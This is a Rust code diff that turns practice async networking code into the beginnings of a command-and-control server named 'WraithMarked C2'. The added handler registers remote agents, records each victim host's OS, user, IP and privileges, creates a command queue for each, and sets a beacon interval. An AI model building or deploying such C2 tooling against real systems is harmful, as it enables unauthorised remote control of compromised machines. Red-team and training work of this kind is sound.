@@ -1,86 +1,67 @@
-use tokio::time::{interval, sleep, timeout, Duration};
+use axum::{Json, extract::State};
 
-mod tcp_stream;
+use crate::models::{Agent, AppState, RegisterRequest, RegisterResponse};
+use chrono::Utc;
+use std::{
+    collections::VecDeque,
+    sync::{Arc, Mutex},
+};
 
-use tcp_stream::try_connect_with_timeout;
+mod c2_server;
+mod models;
+
+type SharedState = Arc<Mutex<AppState>>;
 
 #[tokio::main]
 async fn main() {
-    // for port in [22, 80, 443] {
-    //     tokio::spawn(async move {
-    //         println!("Starting server on port: {}", port);
+    println!("===========================================");
+    println!("    WraithMarked C2 Server Starting...   ");
+    println!("===========================================\n");
 
-    //         tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
-
-    //         println!("Finished scanning port: {}", port);
-    //     });
-    // }
-
-    // Keep the main function alive to allow async tasks to run
-    // loop {
-    // tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
-    // }
-
-    // Handles
-    /*  let hosts = vec![
-        "192.168.1.1".to_string(),
-        "10.0.0.5".to_string(),
-        "172.16.0.3".to_string(),
-    ];
-
-    let mut handles = Vec::new();
-
-    for host in hosts {
-        let handle = tokio::spawn(async move {
-            println!("Pinging host: {}", host);
-            sleep(Duration::from_secs(1)).await;
-            println!("Host {} is reachable", host);
-        });
-
-        handles.push(handle);
-    }
-
-    // Wait for all tasks to finish
-    for handle in handles {
-        handle.await.unwrap();
-    } */
-
-    // periodic_checker().await;
-    //try_connect_with_timeout(addr, dur)
-    match try_connect_with_timeout("192.168.1.9:5432", Duration::from_secs(1)).await {
-        Ok(_) => println!("connected quickly"),
-        Err(e) => println!("failed: {}", e),
-    }
+    // Start the HTTP server
+    c2_server::start_server().await;
 }
-/*
+async fn handle_register(
+    State(state): State<SharedState>,
+    Json(req): Json<RegisterRequest>,
+) -> Json<RegisterResponse> {
+    println!("📥 Registration request from agent: {}", req.agent_id);
 
-   let mut ticker = interval(Duration::from_secs(5));
+    // Lock the state to modify it
+    let mut state = state.lock().unwrap();
 
-    for i in 0..3 {
-        ticker.tick().await;
-        println!("Beacon check-in {}", i);
-    }
-*/
+    // Create Agent struct from request
+    let agent = Agent {
+        id: req.agent_id.clone(),
+        hostname: req.hostname,
+        os: req.os,
+        os_version: req.os_version,
+        user: req.user,
+        ip: req.ip,
+        privileges: req.privileges,
+        version: req.version,
+        last_seen: Utc::now(),
+        first_seen: Utc::now(),
+    };
 
-//  Beacon (interval) — periodic check-in
-// #[tokio::main]
-async fn periodic_checker() {
-    let mut ticker = interval(Duration::from_secs(5));
+    // Store agent in HashMap
+    state.agents.insert(req.agent_id.clone(), agent.clone());
 
-    let beacon_handle = tokio::spawn(async move {
-        let mut count = 0;
-        loop {
-            ticker.tick().await;
-            count += 1;
-            println!("[beacon] check-in #{count}");
-        }
-    });
+    // Initialize empty command queue for this agent
+    state
+        .command_queues
+        .insert(req.agent_id.clone(), VecDeque::new());
 
-    println!("Press Ctrl+C to stop");
-    tokio::signal::ctrl_c().await.unwrap();
-    println!("Shutting down...");
+    println!("✅ Agent registered: {} ({})", agent.hostname, agent.id);
+    println!(
+        "   OS: {} | User: {} | IP: {}",
+        agent.os, agent.user, agent.ip
+    );
 
-    beacon_handle.abort();
-    let _ = beacon_handle.await;
-    println!("Exited");
+    // Return success response
+    Json(RegisterResponse {
+        success: true,
+        message: "Agent registered successfully".to_string(),
+        beacon_interval: 10, // Agent should beacon every 10 seconds
+    })
 }
